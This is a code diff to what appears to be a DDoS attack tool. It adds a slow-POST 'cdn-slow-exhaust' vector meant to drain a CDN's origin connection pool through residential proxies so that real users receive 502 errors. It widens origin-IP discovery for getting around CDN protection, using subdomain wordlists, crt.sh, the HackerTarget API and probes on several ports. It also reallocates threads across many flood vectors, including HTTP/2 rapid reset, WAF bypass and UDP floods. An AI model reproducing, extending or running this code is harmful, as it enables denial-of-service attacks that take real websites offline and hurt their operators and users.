@@ -440,13 +440,15 @@ const HTTP_PROXY_METHODS = new Set([
   "origin-bypass",
   // CDN cache invalidation — purge requests via proxy to force origin hit on every req
   "cdn-purge-flood",
+  // CDN pool exhaustion — slow POST through CDN to exhaust origin connection pool via residential IPs
+  "cdn-slow-exhaust",
 ]);
 
 // Methods that hold connections open — slow proxies are acceptable (latency doesn't matter)
 // Using slow proxies here frees up fast proxies for latency-sensitive vectors
 const SLOW_PROXY_METHODS = new Set([
   "slowloris", "rudy-v2", "slow-read", "sse-exhaust", "keepalive-exhaust",
-  "cdn-purge-flood", "ws-flood", "conn-flood",
+  "cdn-purge-flood", "ws-flood", "conn-flood", "cdn-slow-exhaust",
 ]);
 
 // ── Cloudflare IP range check (for origin-bypass auto-discovery) ──────────
@@ -473,40 +475,86 @@ function _isCFIP(ip: string): boolean {
 // Probe a candidate IP to confirm it's the real origin (not a CDN edge)
 // Returns true if the IP looks like an origin server (no CDN server header)
 async function _isRealOrigin(ip: string, hostname: string): Promise<boolean> {
-  return new Promise(resolve => {
-    const CDN_SIGNATURES = ["gocache","cloudflare","akamai","fastly","sucuri","incapsula",
-      "varnish","nginx-cdn","cdn","edgesuite","edgekey","llnwd","edgecastcdn"];
-    const req = https.request({
-      host: ip, path: "/", port: 443, rejectUnauthorized: false, timeout: 4000,
-      headers: { "Host": hostname, "User-Agent": "Mozilla/5.0" },
-    }, res => {
-      const srv = (res.headers["server"] || "").toLowerCase();
-      const via = (res.headers["via"] || "").toLowerCase();
-      const xCache = (res.headers["x-cache"] || "").toLowerCase();
-      const isCDN = CDN_SIGNATURES.some(s => srv.includes(s) || via.includes(s) || xCache.includes(s));
-      resolve(!isCDN);
-    });
-    req.on("error", () => resolve(false)); // connection error = not open = not usable origin
-    req.on("timeout", () => { req.destroy(); resolve(false); });
-    req.end();
+  const CDN_SIGNATURES = ["gocache","cloudflare","akamai","fastly","sucuri","incapsula",
+    "varnish","nginx-cdn","edgesuite","edgekey","llnwd","edgecastcdn","imperva","radware",
+    "arbor","f5","barracuda","reblaze","stackpath","bunnycdn","keycdn","cdn77","cdnify"];
+
+  // Try both port 443 and port 80 — many origins respond on HTTP even if site uses HTTPS
+  const tryPort = (port: number, useHttps: boolean): Promise<boolean> => new Promise(resolve => {
+    const opts = useHttps
+      ? { host: ip, path: "/", port, rejectUnauthorized: false, timeout: 6000,
+          headers: { "Host": hostname, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept": "text/html" } }
+      : { host: ip, path: "/", port, timeout: 6000 };
+
+    const doReq = (mod: typeof https | typeof http) => {
+      const req = mod.request({
+        ...opts,
+        headers: { "Host": hostname, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept": "text/html" },
+      }, res => {
+        const srv   = (res.headers["server"] || "").toLowerCase();
+        const via   = (res.headers["via"]    || "").toLowerCase();
+        const xPow  = (res.headers["x-powered-by"] || "").toLowerCase();
+        const isCDN = CDN_SIGNATURES.some(s => srv.includes(s) || via.includes(s));
+        // Accept if: not CDN, or server header looks like a real app server
+        const isApp = /nginx|apache|litespeed|iis|gunicorn|uvicorn|php|wordpress|joomla|drupal/i.test(srv + xPow);
+        resolve(!isCDN || isApp);
+      });
+      req.on("error", () => resolve(false));
+      req.on("timeout", () => { req.destroy(); resolve(false); });
+      req.end();
+    };
+
+    if (useHttps) doReq(https);
+    else doReq(http);
   });
+
+  // Try HTTPS first (443), then HTTP (80) if no luck, then common alt ports
+  const [ok443, ok80, ok8080, ok8000] = await Promise.all([
+    tryPort(443, true),
+    tryPort(80,  false),
+    tryPort(8080, false),
+    tryPort(8000, false),
+  ]);
+  return ok443 || ok80 || ok8080 || ok8000;
 }
 
 // Finds the real origin IP behind a CDN using DNS enumeration + SPF + IPv6
 // All candidates are verified via HTTP probe — if server header shows CDN, skip it
 async function _findOriginIPForAttack(hostname: string, cdnIPs: string[]): Promise<string | null> {
   const BYPASS_SUBS = [
-    "direct", "mail", "smtp", "origin", "backend", "server", "api",
-    "staging", "www2", "cpanel", "ftp", "webmail", "admin", "dev",
-    "old", "ns1", "ns2", "pop", "imap", "relay", "host", "vpn",
-    "static", "assets", "cdn", "media", "upload", "files", "img",
+    // Common origin reveals
+    "direct", "origin", "backend", "server", "real", "naked", "vps", "host",
+    "old", "legacy", "backup", "fallback", "live", "prod", "production",
+    // Mail/communication (often same IP as web origin)
+    "mail", "smtp", "pop", "pop3", "imap", "relay", "mx", "mx1", "mx2",
+    "webmail", "email", "autodiscover", "autoconfig",
+    // Dev/staging
+    "dev", "develop", "development", "staging", "stage", "stg", "beta",
+    "test", "teste", "testing", "demo", "sandbox", "preview", "homolog",
+    "homologacao", "homologacão",
+    // Admin/cPanel
+    "cpanel", "whm", "plesk", "directadmin", "admin", "panel", "painel",
+    "manage", "control", "dashboard", "portal", "backoffice",
+    // Sub-sites
+    "www2", "www3", "m", "mobile", "app", "apps", "api", "api2",
+    "loja", "shop", "store", "ecommerce", "cart",
+    "blog", "forum", "faq", "help", "support", "suporte",
+    "intranet", "internal", "private", "priv",
+    // Infrastructure
+    "ftp", "sftp", "ssh", "vpn", "proxy", "gateway", "fw", "firewall",
+    "ns1", "ns2", "ns3", "dns", "rdns",
+    "static", "assets", "cdn", "media", "upload", "files", "img", "images",
+    "video", "downloads", "dl", "content",
+    // Common for Brazilian sites
+    "loja", "vendas", "pedidos", "cadastro", "acesso",
+    "painel", "central", "gerenciamento", "sistema",
   ];
 
   const seen = new Set<string>(cdnIPs);
   const mu   = new Set<string>(); // dedup in-flight
 
   // Collect ALL candidate IPs from ALL sources in parallel, then verify all at once
-  const [subResults, ipv6Results, txtResults, mxResults, crtResults] = await Promise.allSettled([
+  const [subResults, ipv6Results, txtResults, mxResults, crtResults, htResults] = await Promise.allSettled([
     // 1. Subdomains — all resolved simultaneously
     Promise.allSettled(BYPASS_SUBS.map(sub =>
       dnsP.resolve4(`${sub}.${hostname}`).catch(() => [] as string[])
@@ -522,7 +570,7 @@ async function _findOriginIPForAttack(hostname: string, cdnIPs: string[]): Promi
     (async () => {
       const baseDom = hostname.split(".").slice(-2).join(".");
       const ac = new AbortController();
-      const timer = setTimeout(() => ac.abort(), 5_000);
+      const timer = setTimeout(() => ac.abort(), 8_000);
       try {
         const r = await fetch(
           `https://crt.sh/?q=%25.${baseDom}&output=json`,
@@ -532,6 +580,31 @@ async function _findOriginIPForAttack(hostname: string, cdnIPs: string[]): Promi
         const j = await r.json() as { name_value: string }[];
         const subs = [...new Set(j.flatMap(e => e.name_value.split("\n").map(s => s.trim().replace(/^\*\./, ""))))];
         return subs.filter(s => s.endsWith(`.${baseDom}`) || s === baseDom);
+      } catch { clearTimeout(timer); return [] as string[]; }
+    })(),
+    // 6. HackerTarget DNS lookup — free public API that resolves all known subdomains
+    (async () => {
+      const baseDom = hostname.split(".").slice(-2).join(".");
+      const ac = new AbortController();
+      const timer = setTimeout(() => ac.abort(), 8_000);
+      try {
+        const r = await fetch(
+          `https://api.hackertarget.com/hostsearch/?q=${baseDom}`,
+          { headers: { "User-Agent": "Mozilla/5.0" }, signal: ac.signal }
+        );
+        clearTimeout(timer);
+        const text = await r.text();
+        if (text.includes("error") || text.includes("API count")) return [] as string[];
+        // Format: "subdomain,ip\n..." — extract IPs directly
+        const ips: string[] = [];
+        for (const line of text.trim().split("\n")) {
+          const parts = line.split(",");
+          if (parts.length === 2) {
+            const ip = parts[1].trim();
+            if (/^\d+\.\d+\.\d+\.\d+$/.test(ip)) ips.push(ip);
+          }
+        }
+        return ips;
       } catch { clearTimeout(timer); return [] as string[]; }
     })(),
   ] as const);
@@ -586,7 +659,7 @@ async function _findOriginIPForAttack(hostname: string, cdnIPs: string[]): Promi
   if (crtResults.status === "fulfilled" && crtResults.value.length > 0) {
     console.log(`[origin-discovery] crt.sh found ${crtResults.value.length} subdomains for ${hostname}`);
     const crtIpLists = await Promise.allSettled(
-      crtResults.value.slice(0, 40).map(sub => dnsP.resolve4(sub).catch(() => [] as string[]))
+      crtResults.value.slice(0, 60).map(sub => dnsP.resolve4(sub).catch(() => [] as string[]))
     );
     for (const r of crtIpLists) {
       if (r.status === "fulfilled") {
@@ -594,6 +667,15 @@ async function _findOriginIPForAttack(hostname: string, cdnIPs: string[]): Promi
           if (!_isCFIP(ip) && !seen.has(ip) && !mu.has(ip)) { mu.add(ip); candidates.push(ip); }
         }
       }
+    }
+  }
+
+  // Collect from HackerTarget — returns IPs directly (already resolved)
+  if (htResults.status === "fulfilled" && (htResults.value as string[]).length > 0) {
+    const htIps = htResults.value as string[];
+    console.log(`[origin-discovery] HackerTarget found ${htIps.length} IPs for ${hostname}`);
+    for (const ip of htIps) {
+      if (!_isCFIP(ip) && !seen.has(ip) && !mu.has(ip)) { mu.add(ip); candidates.push(ip); }
     }
   }
 
@@ -1185,21 +1267,37 @@ async function runAttackWorkers(
 
     console.log(`[geass-absolutum] ∞ INICIANDO — ${threads} threads — CDN fronts ativos AGORA, origin discovery em paralelo...`);
 
-    // ── Front A: CDN/Host — 13 vectors — STARTS RIGHT NOW ─────────────────
+    // Thread budget for cdn-slow-exhaust (CDN pool exhaustion)
+    const slowExT_ab = Math.max(100, Math.round(threads * (IS_DEPLOYED ? 0.06 : 0.05)));
+    const cdnT_actual = threads - dnsT_ab - sprayT_ab - originT_ab - kaT_ab - purgeT_ab - slowExT_ab;
+    const rrT_adj   = Math.max(600,  Math.round(cdnT_actual * 0.55));
+    const wafT_adj  = Math.max(500,  Math.round(cdnT_actual * 0.45));
+    const h2T_adj   = Math.max(600,  Math.round(cdnT_actual * 0.50));
+    const appT_adj  = Math.max(400,  Math.round(cdnT_actual * 0.35));
+    const tlsT_adj  = Math.max(150,  Math.round(cdnT_actual * 0.10));
+    const connT_adj = Math.max(200,  Math.round(cdnT_actual * 0.12));
+    const pipeT_adj = Math.max(1000, Math.round(cdnT_actual * 0.70));
+    const sseT_adj  = Math.max(80,   Math.round(cdnT_actual * 0.06));
+    const udpT_adj  = Math.max(100,  Math.round(cdnT_actual * 0.08));
+    const h3T_adj   = Math.max(100,  Math.round(cdnT_actual * 0.08));
+
+    // ── Front A: CDN/Host — 14 vectors — STARTS RIGHT NOW ─────────────────
     const immediateFronts: Promise<void>[] = [
-      spawnPool("rapid-reset",         target, port, rrT_ab,    W(4), signal, onStats),
-      spawnPool("waf-bypass",          target, port, wafT_ab,   W(3), signal, onStats),
-      spawnPool("h2-storm",            target, port, h2T_ab,    W(4), signal, onStats),
-      spawnPool("app-smart-flood",     target, port, appT_ab,   W(3), signal, onStats),
-      spawnPool("tls-session-exhaust", target, port, tlsT_ab,   IS_DEPLOYED ? Math.max(8, CPU_COUNT * 2) : 1, signal, onStats),
-      spawnPool("conn-flood",          target, port, connT_ab,  IS_DEPLOYED ? Math.max(8, CPU_COUNT * 2) : 1, signal, onStats),
-      spawnPool("http-pipeline",       target, port, pipeT_ab,  W(4), signal, onStats),
-      spawnPool("sse-exhaust",         target, port, sseT_ab,   IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
-      spawnPool("udp-flood",           target, port, udpT_ab,   IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
-      spawnPool("h3-rapid-reset",      target, port, h3T_ab,    W(4), signal, onStats),
+      spawnPool("rapid-reset",         target, port, rrT_adj,    W(4), signal, onStats),
+      spawnPool("waf-bypass",          target, port, wafT_adj,   W(3), signal, onStats),
+      spawnPool("h2-storm",            target, port, h2T_adj,    W(4), signal, onStats),
+      spawnPool("app-smart-flood",     target, port, appT_adj,   W(3), signal, onStats),
+      spawnPool("tls-session-exhaust", target, port, tlsT_adj,   IS_DEPLOYED ? Math.max(8, CPU_COUNT * 2) : 1, signal, onStats),
+      spawnPool("conn-flood",          target, port, connT_adj,  IS_DEPLOYED ? Math.max(8, CPU_COUNT * 2) : 1, signal, onStats),
+      spawnPool("http-pipeline",       target, port, pipeT_adj,  W(4), signal, onStats),
+      spawnPool("sse-exhaust",         target, port, sseT_adj,   IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
+      spawnPool("udp-flood",           target, port, udpT_adj,   IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
+      spawnPool("h3-rapid-reset",      target, port, h3T_adj,    W(4), signal, onStats),
       spawnPool("keepalive-exhaust",   target, port, kaT_ab,    IS_DEPLOYED ? Math.max(6, CPU_COUNT) : 1, signal, onStats),
       spawnPool("cdn-purge-flood",     target, port, purgeT_ab, IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
       spawnPool("dns-ns-flood",        target, port, dnsT_ab,   IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
+      // ★ NEW: CDN pool exhaustion — COMPLETE POST requests trickled to exhaust origin connection pool
+      spawnPool("cdn-slow-exhaust",    target, port, slowExT_ab, IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
     ];
 
     // ── Front D: Subdomain Spray (deploy only) — STARTS RIGHT NOW ─────────
@@ -1375,6 +1473,7 @@ const METHODS_CATALOGUE = [
   { id: "tls-session-exhaust",  name: "TLS Session Cache Exhaustion",          layer: "L4",   protocol: "TLS",                  tier: "A",      description: "Full TLS handshake per conn — no resumption — saturates server's RSA/ECDHE crypto thread pool. 5× more CPU-intensive than conn-flood" },
   { id: "cache-buster",         name: "Cache Busting — 100% Origin Hit Rate",  layer: "L7",   protocol: "HTTP",                 tier: "A",      description: "Unique cache keys + Cache-Control:no-cache + Vary bombs — forces CDN to miss 100% of requests, overwhelming the origin directly" },
   { id: "cdn-purge-flood",     name: "CDN Purge Flood — Cache Invalidation",  layer: "L7",   protocol: "HTTP/HTTPS",           tier: "S",      description: "Floods CDN purge endpoints (GoCache /cdn-cgi/purge, /cdn-cgi/cache-purge, PURGE/BAN methods) via proxies — forces cache miss on every subsequent request, routing all traffic to origin. GoCache-specific + generic." },
+  { id: "cdn-slow-exhaust",    name: "CDN Pool Exhaust — Slow POST Origin",   layer: "L7",   protocol: "HTTP/HTTPS",           tier: "S",      description: "Esgota o pool de conexões CDN→origin via slow POST. Envia headers COMPLETOS (GoCache repassa ao origin), depois trickle 1 byte/8-18s para 1GB Content-Length. Origin segura thread aguardando body. Com ~200 conexões simultâneas via proxies residenciais, GoCache retorna 502 a usuários reais." },
   // Previously missing from catalogue
   { id: "udp-bypass",           name: "UDP Bypass",                            layer: "L4",   protocol: "UDP",                  tier: "B",      description: "UDP flood with bypass techniques to evade basic rate limiting and DDoS mitigation" },
   { id: "tcp-ack",              name: "TCP ACK Flood",                         layer: "L4",   protocol: "TCP",                  tier: "B",      description: "Sends ACK packets without established connections, forcing the target to process each one" },
